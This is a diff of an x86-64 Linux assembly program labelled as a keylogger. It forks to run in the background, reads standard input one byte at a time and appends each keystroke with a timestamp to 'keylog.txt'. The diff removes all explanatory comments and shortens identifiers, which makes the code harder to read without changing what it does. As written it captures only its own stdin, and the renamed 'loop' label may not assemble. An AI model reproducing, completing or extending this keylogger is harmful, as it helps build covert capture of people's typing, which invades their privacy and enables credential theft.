@@ -1,99 +1,97 @@
 section .data
-    filename db "keylog.txt", 0
-    fd dq 0                    ; stockage du fd
-    time_buf db 64 dup(0)     ; buffer pour le timestamp
-    newline db 0xa            ; retour ligne
-    sep db " | ", 0           ; separateur
-    daemon_pid dq 0           ; pid du processus enfant
+    fname db "keylog.txt", 0
+    fd dq 0                
+    tbuf db 64 dup(0)      
+    nl db 0xa            
+    s db " | ", 0          
+    dpid dq 0           
 
 section .bss
-    buffer resb 1              ; buffer pour la touche
-    timespec resq 2            ; struct timespec pour time
+    buf resb 1             
+    tspec resq 2           
 
 section .text
 global _start
 
 _start:
-    ; fork pour daemonize
-    mov rax, 57               ; sys_fork
+    ; fork
+    mov rax, 57           
     syscall
     
     cmp rax, 0
-    je child                  ; processus enfant
-    mov [daemon_pid], rax     ; sauvegarde pid enfant
-    jmp parent               
+    je child              
+    mov [dpid], rax      
+    jmp parent           
 
 child:
-    ; ouverture fichier
-    mov rax, 2                ; open
-    mov rdi, filename
-    mov rsi, 102o            ; append + create + write
-    mov rdx, 0644o           ; perms
+    ; init
+    mov rax, 2            
+    mov rdi, fname
+    mov rsi, 102o        
+    mov rdx, 0644o       
     syscall
     
-    mov [fd], rax            ; save fd
+    mov [fd], rax        
 
-read_loop:
-    ; recup timestamp
-    mov rax, 228             ; clock_gettime
-    mov rdi, 0               ; CLOCK_REALTIME
-    mov rsi, timespec
+loop:
+    ; time
+    mov rax, 228         
+    mov rdi, 0           
+    mov rsi, tspec
     syscall
 
-    ; recup stdin
+    ; read
     mov rax, 0                
     mov rdi, 0                
-    mov rsi, buffer
+    mov rsi, buf
     mov rdx, 1                
     syscall
 
-    ; check si 'q' pour quitter
-    cmp byte [buffer], 'q'
+    ; check q
+    cmp byte [buf], 'q'
     je exit
 
-    ; timestamp
-    mov rax, [timespec]
-    mov rdi, time_buf
-    call format_time
+    ; format
+    mov rax, [tspec]
+    mov rdi, tbuf
+    call ft
 
-    ; ecrit timestamp
+    ; write time
     mov rax, 1                
     mov rdi, [fd]
-    mov rsi, time_buf
+    mov rsi, tbuf
     mov rdx, 20              
     syscall
 
-    ; ecrit sep
+    ; write sep
     mov rax, 1
     mov rdi, [fd]
-    mov rsi, sep
+    mov rsi, s
     mov rdx, 3
     syscall
 
-    ; ecrit la touche
+    ; write key
     mov rax, 1                
     mov rdi, [fd]
-    mov rsi, buffer
+    mov rsi, buf
     mov rdx, 1
     syscall
 
-    ; ecrit newline
+    ; write nl
     mov rax, 1
     mov rdi, [fd]
-    mov rsi, newline
+    mov rsi, nl
     mov rdx, 1
     syscall
 
-    jmp read_loop
+    jmp loop
 
 parent:
-    ; parent sort direct
     mov rax, 60              
     xor rdi, rdi
     syscall
 
 exit:
-    ; ferme fichier
     mov rax, 3                
     mov rdi, [fd]
     syscall
@@ -102,19 +100,16 @@ exit:
     xor rdi, rdi
     syscall
 
-; convertit timestamp en string
-format_time:
-    ; rax = timestamp
-    ; rdi = buffer destination
+ft:
     push rbx
     push rcx
     
-    mov rbx, 10              ; diviseur
-    add rdi, 19              ; position fin buffer
-    mov byte [rdi], 0        ; termine string
+    mov rbx, 10             
+    add rdi, 19             
+    mov byte [rdi], 0       
     
-    mov rcx, 19             ; longueur max
-.loop:
+    mov rcx, 19            
+.l:
     dec rdi
     xor rdx, rdx
     div rbx
@@ -122,7 +117,7 @@ format_time:
     mov [rdi], dl
     dec rcx
     test rax, rax
-    jnz .loop
+    jnz .l
     
     pop rcx
     pop rbx
